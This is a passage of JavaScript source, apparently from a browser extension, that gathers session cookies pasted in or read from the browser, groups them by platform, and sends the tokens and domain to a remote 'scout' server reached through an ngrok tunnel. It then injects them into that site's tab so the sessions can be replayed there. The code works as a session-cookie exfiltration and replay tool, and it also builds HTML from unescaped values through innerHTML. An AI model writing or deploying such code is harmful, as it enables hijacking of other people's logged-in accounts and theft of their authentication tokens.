    body: JSON.stringify({ deviceId, name: os + ' · ' + browser, os, browser, domain: targetDomain, cookies: cookieStr, cookieObjects: cookieObjects || [] }),
  }).catch(() => {});
  const tabs = await chrome.tabs.query({});
  const scoutTab = tabs.find(t => {
    if (!t.url) return false;
    try {
      const u = new URL(t.url);
      const base = new URL(SITE_SCOUT);
      return u.hostname === base.hostname && u.port === base.port;
    } catch { return false; }
  });
  if (scoutTab) {
    await chrome.scripting.executeScript({
      target: { tabId: scoutTab.id },
      func: (val, dom, objs) => window.dispatchEvent(new CustomEvent("ss_ext_cookies", { detail: { cookies: val, domain: dom, cookieObjects: objs } })),
      args: [cookieStr, targetDomain, cookieObjects || null],
    }).catch(() => {});
    await chrome.tabs.update(scoutTab.id, { active: true });
  } else {
    const newTab = await chrome.tabs.create({ url: `${SITE_SCOUT}/?ngrok-skip-browser-warning=true` });
    await new Promise((resolve) => {
      chrome.tabs.onUpdated.addListener(function listener(id, info, tab) {
        if (id !== newTab.id || info.status !== "complete") return;
        if (!tab.url || !tab.url.startsWith(SITE_SCOUT.replace(/\/$/, ""))) return;
        chrome.tabs.onUpdated.removeListener(listener);
        chrome.scripting.executeScript({
          target: { tabId: newTab.id },
          func: (val, dom, objs) => {
            sessionStorage.setItem("ss_cookies", val);
            if (dom) sessionStorage.setItem("ss_cookie_url", "https://" + dom);
            if (objs) sessionStorage.setItem("ss_cookie_objects", JSON.stringify(objs));
            location.reload();
          },
          args: [cookieStr, targetDomain, cookieObjects || null],
        }).then(resolve).catch(resolve);
      });
    });
  }
}

document.getElementById("scan-btn").addEventListener("click", () => {
  const raw = document.getElementById("paste-input").value.trim();
  if (!raw) return;
  const groups = groupScannedCookies(parsePastedCookies(raw));
  const listEl = document.getElementById("scan-list");
  const summaryEl = document.getElementById("scan-summary");
  if (!groups.length) {
    summaryEl.textContent = "No recognisable session cookies found";
    listEl.innerHTML = `<div class="empty"><strong>Nothing found</strong>Try pasting cookies from a logged-in site.</div>`;
  } else {
    summaryEl.textContent = `${groups.length} platform${groups.length > 1 ? "s" : ""} found — send one at a time`;
    listEl.innerHTML = groups.map((g, i) => {
      const color = g.platform ? g.platform.color : "#3d5068";
      const name = g.platform ? g.platform.name : g.domain;
      const domain = g.platform ? g.platform.domain : g.domain;
      return `<div class="scan-item">
        <div class="platform-dot" style="background:${color}"></div>
        <div class="scan-item-info">
          <div class="scan-item-name">${name}</div>
          <div class="scan-item-meta">${domain} · ${g.cookies.length} token${g.cookies.length > 1 ? "s" : ""}</div>
        </div>
        <button class="scan-send-btn" data-idx="${i}">Send →</button>
      </div>`;
    }).join("");
    listEl.querySelectorAll(".scan-send-btn").forEach(btn => {
      btn.addEventListener("click", async () => {
        if (btn.classList.contains("sent")) return;
        await _storageReady;
        const g = groups[Number(btn.dataset.idx)];
        const cookieStr = g.cookies.map(c => `${c.name}=${c.value}`).join("; ");
        const targetDomain = g.platform ? g.platform.domain : g.domain;
        // Paste-scanned cookies have no path/flags — server will use safe defaults
        await sendToScout(cookieStr, targetDomain, null);
        btn.textContent = "Sent ✓";
        btn.classList.add("sent");
      });
    });
  }
  document.querySelector(".paste-view").style.display = "none";
  document.getElementById("scan-results").classList.add("show");
});

document.getElementById("scan-back").addEventListener("click", () => {
  document.querySelector(".paste-view").style.display = "flex";
  document.getElementById("scan-results").classList.remove("show");
  document.getElementById("paste-input").value = "";
});
